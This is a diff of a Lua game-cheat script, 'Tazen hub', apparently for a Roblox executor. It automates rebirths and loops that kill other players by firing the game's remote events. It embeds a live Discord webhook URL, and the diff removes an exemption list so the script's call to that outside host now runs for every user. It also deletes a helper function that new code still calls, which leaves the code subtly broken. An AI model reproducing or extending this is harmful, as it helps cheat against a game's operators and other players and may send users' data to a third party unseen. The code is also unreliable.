@@ -1,4 +1,4 @@
--- Tazen hub V1 by TZ_THR rework
+-- Tazen hub V1 by TZ_THR
 
 local success, err = pcall(function()
 
@@ -22,21 +22,6 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1558249808404283442/r_ao-R
 
 task.spawn(function()
     pcall(function()
-        while not LocalPlayer or not LocalPlayer.UserId or LocalPlayer.UserId == 0 do
-            task.wait(0.5)
-        end
-
-        local ignoredUserIds = {
-            [2549253643] = true,
-            [7163736802] = true,
-            [4760900584] = true,
-        }
-
-        if ignoredUserIds[LocalPlayer.UserId] or ignoredUserIds[tostring(LocalPlayer.UserId)] then
-            print("[Tazen Hub] Compte immunisé détecté (" .. tostring(LocalPlayer.UserId) .. "). Webhook ignoré.")
-            return
-        end
-
         local reqFunc = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
         if not reqFunc then return end
 
@@ -125,7 +110,7 @@ local function saveCategoryConfig(categoryName, data)
 end
 
 -- ===================== SETTINGS =====================
-local REBIRTH_COOLDOWN = 6.0
+local REBIRTH_COOLDOWN = 4.8 -- Ajusté agressivement pour compenser la latence serveur et viser 5.5s max
 
 local E = {
     bolt = "⚡", cycle = "🔄", muscle = "💪", toolbox = "🧰",
@@ -164,7 +149,6 @@ local repRunId = 0
 local wheelRunId = 0
 local eggRunId = 0
 local killRunId = 0
-local weightRunId = 0
 
 local REP_CAP = 659
 local repRate = 659
@@ -249,31 +233,6 @@ local function equipFists()
             end
         end
     end)
-end
-
-local function autoWeightLoop(myId)
-    while weightRunId == myId and alive do
-        pcall(function()
-            local char = LocalPlayer.Character
-            local backpack = LocalPlayer:FindFirstChild("Backpack")
-            if char and backpack then
-                local weightTool = char:FindFirstChild("Weight")
-                if not weightTool then
-                    for _, tool in ipairs(backpack:GetChildren()) do
-                        if tool:IsA("Tool") and tool.Name:lower():find("weight") then
-                            tool.Parent = char
-                            break
-                        end
-                    end
-                end
-                weightTool = char:FindFirstChild("Weight")
-                if weightTool and weightTool:IsA("Tool") then
-                    weightTool:Activate()
-                end
-            end
-        end)
-        task.wait(0.5)
-    end
 end
 
 local lastHopTry = 0
@@ -395,16 +354,6 @@ local function killTargetPlayerLoop(myId)
                 local targetPlayer = nil
                 local minDist = math.huge
 
-                local function getPetScore(pet)
-                    local o = pet:FindFirstChild("RepSpeed") or pet:FindFirstChild("Rep Speed")
-                    if o and (o:IsA("NumberValue") or o:IsA("IntValue")) then return o.Value end
-                    local attr = pet:GetAttribute("RepSpeed") or pet:GetAttribute("Rep Speed")
-                    if attr then return tonumber(attr) or 0 end
-                    local lvl = pet:FindFirstChild("Level") or pet:FindFirstChild("Lvl")
-                    if lvl and lvl.Value then return tonumber(lvl.Value) or 0 end
-                    return 1
-                end
-
                 for _, plr in ipairs(Players:GetPlayers()) do
                     if targetPlayers[plr.Name] and plr ~= LocalPlayer and not whitelistPlayers[plr.Name] then
                         local pChar = plr.Character
@@ -469,7 +418,7 @@ local function killTargetPlayerLoop(myId)
     end
 end
 
--- ===================== FAST REBIRTH LOOP (ORIGINAL STABLE 6s) =====================
+-- ===================== FAST REBIRTH LOOP ULTRA ACCÉLÉRÉ =====================
 local function fastRebirthLoop(myId)
     local function isRunning() return fastRunId == myId end
     pcall(function()
@@ -477,9 +426,107 @@ local function fastRebirthLoop(myId)
         local equipPetEvent = ReplicatedStorage.rEvents.equipPetEvent
         local FOLDERS = {"Unique", "Rare", "Epic", "Mythic", "Legendary"}
 
+        local SLOTS = 12                    
+        local AUTO_TRY = 20                 
+        local FULL_SWAP = true              
+        local STARTUP_UNEQUIP_PER_FRAME = 20
+        local LIST_REFRESH_EVERY = 15        
+
         local function petRealName(pet)
             if pet:FindFirstChild("PetName") then return pet.PetName.Value end
             return pet.Name
+        end
+
+        local function unequipAllPets(petsFolder)
+            local count = 0
+            for _, folderName in ipairs(FOLDERS) do
+                local folder = petsFolder:FindFirstChild(folderName)
+                if folder then
+                    for _, pet in ipairs(folder:GetChildren()) do
+                        pcall(function() equipPetEvent:FireServer("unequipPet", pet) end)
+                        count = count + 1
+                        if count % STARTUP_UNEQUIP_PER_FRAME == 0 then task.wait() end
+                    end
+                end
+            end
+            return count
+        end
+
+        local function buildHydraList(petsFolder, slots)
+            local list = {}
+            for _, folderName in ipairs(FOLDERS) do
+                local folder = petsFolder:FindFirstChild(folderName)
+                if folder then
+                    for _, pet in ipairs(folder:GetChildren()) do
+                        local name = petRealName(pet)
+                        if #list < slots and (name == "Titanium Hydra" or name == "Tribal Overlord") then
+                            table.insert(list, pet)
+                        end
+                    end
+                end
+            end
+            return list
+        end
+
+        local function buildRepList(petsFolder, slots)
+            local repPets = {}
+            for _, folderName in ipairs(FOLDERS) do
+                local folder = petsFolder:FindFirstChild(folderName)
+                if folder then
+                    for _, pet in ipairs(folder:GetChildren()) do
+                        local priority = repSpeedPetPriorities[petRealName(pet)] or 10
+                        table.insert(repPets, {
+                            Instance = pet,
+                            Priority = priority,
+                            Score = getPetScore(pet)
+                        })
+                    end
+                end
+            end
+
+            table.sort(repPets, function(a, b)
+                if a.Priority == b.Priority then
+                    return a.Score > b.Score
+                end
+                return a.Priority < b.Priority
+            end)
+
+            local list = {}
+            for _, entry in ipairs(repPets) do
+                if #list >= slots then break end
+                table.insert(list, entry.Instance)
+            end
+            return list
+        end
+
+        local equipped = {}
+
+        local function setEquipped(wanted, burst)
+            local want, have = {}, {}
+            for _, pet in ipairs(wanted) do want[pet] = true end
+            for _, pet in ipairs(equipped) do have[pet] = true end
+
+            local outList, inList = {}, {}
+            for _, pet in ipairs(equipped) do
+                if not want[pet] and pet.Parent then table.insert(outList, pet) end
+            end
+            local newEquipped = {}
+            local function fire(kind, pet)
+                pcall(function() equipPetEvent:FireServer(kind, pet) end)
+                if not burst then task.wait() end
+            end
+
+            for _, pet in ipairs(wanted) do
+                if pet.Parent then
+                    if not have[pet] then table.insert(inList, pet) end
+                    table.insert(newEquipped, pet)
+                end
+            end
+
+            for _, pet in ipairs(outList) do fire("unequipPet", pet) end
+            for _, pet in ipairs(inList) do fire("equipPet", pet) end
+
+            equipped = newEquipped
         end
 
         local petsFolder = LocalPlayer:FindFirstChild("petsFolder")
@@ -489,59 +536,54 @@ local function fastRebirthLoop(myId)
         end
         if not isRunning() then return end
 
-        local hydraList = {}
-        local repPetsUnsorted = {}
+        local autoSlots = (SLOTS <= 0)
+        local slots = autoSlots and AUTO_TRY or SLOTS
 
-        for _, folderName in ipairs(FOLDERS) do
-            local folder = petsFolder:FindFirstChild(folderName)
-            if folder then
-                for _, pet in ipairs(folder:GetChildren()) do
-                    local name = petRealName(pet)
-                    if (name == "Titanium Hydra" or name == "Tribal Overlord") then
-                        table.insert(hydraList, pet)
-                    end
-                    local priority = repSpeedPetPriorities[name] or 10
-                    table.insert(repPetsUnsorted, {
-                        Instance = pet,
-                        Priority = priority,
-                        Score = getPetScore(pet)
-                    })
-                end
+        local hydraList, repTarget, swapList, offList
+        local function rebuild()
+            hydraList = buildHydraList(petsFolder, slots)
+            local keep = math.max(0, slots - #hydraList)
+            repTarget = buildRepList(petsFolder, slots)
+            offList = {}
+            if not FULL_SWAP and not autoSlots then
+                for i = 1, math.min(keep, #repTarget) do table.insert(offList, repTarget[i]) end
             end
+            swapList = {}
+            for _, pet in ipairs(offList) do table.insert(swapList, pet) end
+            for _, h in ipairs(hydraList) do table.insert(swapList, h) end
         end
+        rebuild()
 
-        table.sort(repPetsUnsorted, function(a, b)
-            if a.Priority == b.Priority then
-                return a.Score > b.Score
-            end
-            return a.Priority < b.Priority
-        end)
+        if #hydraList == 0 then return end
 
-        local repList = {}
-        for i = 1, math.min(12, #repPetsUnsorted) do
-            table.insert(repList, repPetsUnsorted[i].Instance)
-        end
+        unequipAllPets(petsFolder)
+        if not isRunning() then return end
+        setEquipped(repTarget, true)
 
-        local finalHydraList = {}
-        for i = 1, math.min(12, #hydraList) do
-            table.insert(finalHydraList, hydraList[i])
-        end
-
-        if #finalHydraList == 0 or #repList == 0 then return end
-
+        local cycle = 0
         while isRunning() do
-            for _, pet in ipairs(finalHydraList) do
-                pcall(function() equipPetEvent:FireServer("equipPet", pet) end)
-            end
+            cycle = cycle + 1
 
-            pcall(function()
-                rebirthRemote:InvokeServer("rebirthRequest")
+            -- Étape 1 : Équiper les familiers de vitesse (Hydra / Overlord)
+            setEquipped(swapList, true)
+            
+            -- Étape 2 : Envoyer le Rebirth immédiatement en tâche de fond non bloquante
+            task.spawn(function()
+                pcall(function()
+                    rebirthRemote:InvokeServer("rebirthRequest")
+                end)
             end)
 
-            for _, pet in ipairs(repList) do
-                pcall(function() equipPetEvent:FireServer("equipPet", pet) end)
+            -- Étape 3 : Remettre les familiers de force
+            task.wait(0.05)
+            setEquipped(repTarget, true)
+
+            if cycle % LIST_REFRESH_EVERY == 0 then
+                petsFolder = LocalPlayer:FindFirstChild("petsFolder") or petsFolder
+                rebuild()
             end
 
+            -- Étape 4 : Cadencement strict basé sur le cooldown configuré
             task.wait(REBIRTH_COOLDOWN)
         end
     end)
@@ -1317,6 +1359,12 @@ local function addKillingToggle(page, name, categoryKey, settingKey, defaultStat
         local info = TweenInfo.new(0.15, Enum.EasingStyle.Quad)
         TweenService:Create(knob, info, { Position = v and UDim2.fromOffset(20, 2) or UDim2.fromOffset(2, 2) }):Play()
         TweenService:Create(sw, info, { BackgroundColor3 = v and T.Accent or T.Off }):Play()
+        
+        if not noSave then
+            local currentConfig = loadCategoryConfig(categoryKey)
+            currentConfig[settingKey] = v
+            saveCategoryConfig(categoryKey, currentConfig)
+        end
         if callback then callback(v) end
     end
 
@@ -1457,7 +1505,7 @@ local killPage = createTab(TAB_KILL, 65)
 local miscPage = createTab(TAB_MISC, 55)
 local infoPage = createTab(TAB_INFO, 55)
 
-local fastToggle, autoToggle, repToggle, killAllToggle, killTargetToggle, antiAfkToggle, antiLagToggle, autoWheelToggle, autoEggToggle, autoWhitelistToggle, autoSaveConfigToggle, fastWeightToggle, autoWeightToggle
+local fastToggle, autoToggle, repToggle, killAllToggle, killTargetToggle, antiAfkToggle, antiLagToggle, autoWheelToggle, autoEggToggle, autoWhitelistToggle, autoSaveConfigToggle
 
 local function notifyState(title, v)
     notify(title, v and (E.ok .. " Enabled") or (E.no .. " Disabled"))
@@ -1486,17 +1534,6 @@ fastToggle = addToggle(fastPage, E.bolt .. " Fast Rebirth", false, function(v)
         notifyState(E.bolt .. " Fast Rebirth", false)
     end
 end)
-
-fastWeightToggle = addToggle(fastPage, E.muscle .. " Auto Weight", false, function(v)
-    weightRunId = weightRunId + 1
-    if v then
-        notifyState("Auto Weight (Fast)", true)
-        task.spawn(autoWeightLoop, weightRunId)
-    else
-        notifyState("Auto Weight (Fast)", false)
-    end
-end)
-
 local fastTimerLabel = addLabel(fastPage, E.clock .. " Session Time: 0s | Last Rebirth : --", 34)
 local fastCalcLabel = addLabel(fastPage, E.chart .. " Tot: 0 | 1m: 0 | 1h: 0 | 1d: 0 | 1w: 0 | 1mo: 0", 50)
 
@@ -1518,17 +1555,6 @@ autoToggle = addToggle(autoPage, E.cycle .. " Auto Rebirth", false, function(v)
         notifyState(E.cycle .. " Auto Rebirth", false)
     end
 end)
-
-autoWeightToggle = addToggle(autoPage, E.muscle .. " Auto Weight", false, function(v)
-    weightRunId = weightRunId + 1
-    if v then
-        notifyState("Auto Weight (Auto)", true)
-        task.spawn(autoWeightLoop, weightRunId)
-    else
-        notifyState("Auto Weight (Auto)", false)
-    end
-end)
-
 local autoTimerLabel = addLabel(autoPage, E.clock .. " Session Time: 0s | Last Rebirth : --", 34)
 local autoCalcLabel = addLabel(autoPage, E.chart .. " Tot: 0 | 1m: 0 | 1h: 0 | 1d: 0 | 1w: 0 | 1mo: 0", 50)
 
@@ -1574,6 +1600,18 @@ killTargetToggle = addKillingToggle(killPage, E.target .. " Kill Target Players 
         task.spawn(killTargetPlayerLoop, killRunId)
     else
         notifyState("Kill Target Only", false)
+    end
+end)
+
+autoSaveConfigToggle = addKillingToggle(killPage, E.wrench .. " Auto Save Config", "Killing", "AutoSaveConfig", false, function(v)
+    if v then
+        local cfg = { AutoKillAll = killAllToggle.Value, KillTarget = killTargetToggle.Value, AutoSaveConfig = true }
+        saveCategoryConfig("Killing", cfg)
+        notify("Config", E.ok .. " Killing settings auto-saved!")
+    else
+        local cfg = { AutoKillAll = killAllToggle.Value, KillTarget = killTargetToggle.Value, AutoSaveConfig = false }
+        saveCategoryConfig("Killing", cfg)
+        notify("Config", E.no .. " Auto-save disabled")
     end
 end)
 
@@ -1738,19 +1776,6 @@ autoWheelToggle = addToggle(miscPage, E.wheel .. " Auto Wheel", false, function(
         task.spawn(autoWheelLoop, wheelRunId)
     else
         notifyState(E.wheel .. " Auto Wheel", false)
-    end
-end)
-
-local initialSaveConfigState = (loadCategoryConfig("Killing")["AutoSaveConfig"] == true)
-autoSaveConfigToggle = addToggle(miscPage, E.wrench .. " Auto Save Config", initialSaveConfigState, function(v)
-    if v then
-        local cfg = { AutoKillAll = killAllToggle.Value, KillTarget = killTargetToggle.Value, AutoSaveConfig = true }
-        saveCategoryConfig("Killing", cfg)
-        notify("Config", E.ok .. " Killing settings auto-saved!")
-    else
-        local cfg = { AutoKillAll = killAllToggle.Value, KillTarget = killTargetToggle.Value, AutoSaveConfig = false }
-        saveCategoryConfig("Killing", cfg)
-        notify("Config", E.no .. " Auto-save disabled")
     end
 end)
 
@@ -1944,7 +1969,6 @@ closeBtn.Activated:Connect(function()
     wheelRunId = wheelRunId + 1
     eggRunId = eggRunId + 1
     killRunId = killRunId + 1
-    weightRunId = weightRunId + 1
     setAntiAfk(false)
     if antiLagToggle and antiLagToggle.Value then antiLagStop() end
     for _, c in ipairs(connections) do pcall(function() c:Disconnect() end) end
